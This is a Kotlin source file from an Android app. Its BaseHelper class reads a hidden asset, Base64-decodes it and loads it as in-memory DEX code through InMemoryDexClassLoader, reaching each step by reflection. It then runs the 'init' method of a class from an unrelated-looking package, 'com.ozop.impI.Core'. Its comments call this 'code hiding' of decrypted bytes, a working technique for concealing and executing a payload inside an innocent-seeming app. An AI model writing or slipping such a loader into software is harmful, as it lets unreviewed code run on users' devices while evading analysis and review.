package com.charm.refined.helper

import android.content.Context
import java.io.InputStream
import java.lang.reflect.Constructor
import java.util.Base64

/**
 * Date：2025/12/3
 * Describe:
 */
abstract class BaseHelper {
    protected lateinit var mCtx: Context

    protected val cla by lazy { Class.forName("dalvik.system.InMemoryDexClassLoader") }
    var nameStr = ""

    abstract fun fetBuffer(): Any

    abstract fun decla(string: String): Constructor<*>

    protected fun dex() {
// 代码隐藏
// code 为解密的byte数据
        val byteBuffer = fetBuffer()
//"dalvik.system.InMemoryDexClassLoader"
        val constructor = decla("dalvik.system.InMemoryDexClassLoader")

        val clazzLoader = mCtx.javaClass.getMethod("getClassLoader").invoke(mCtx)

        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)
        val loadedClass = classLoader.javaClass.getMethod("loadClass", String::class.java)

            .invoke(classLoader, "com.ozop.impI.Core") as Class<*>

        loadedClass.getMethod("init", Context::class.java).invoke(null, mCtx)
    }

    protected fun fetchStr(): String {
        return nameStr
    }

    protected fun fe(inStr: String): ByteArray {
        val context = mCtx
        val getAssetsMethod = context.javaClass.getMethod("getAssets")
        val assetManager = getAssetsMethod.invoke(context)
        val openMethod = assetManager.javaClass.getMethod("open", String::class.java)
        val r = openMethod.invoke(assetManager, inStr) as InputStream
//        val byte=r.readBytes()
        return Base64.getDecoder().decode(r.readBytes())
    }

}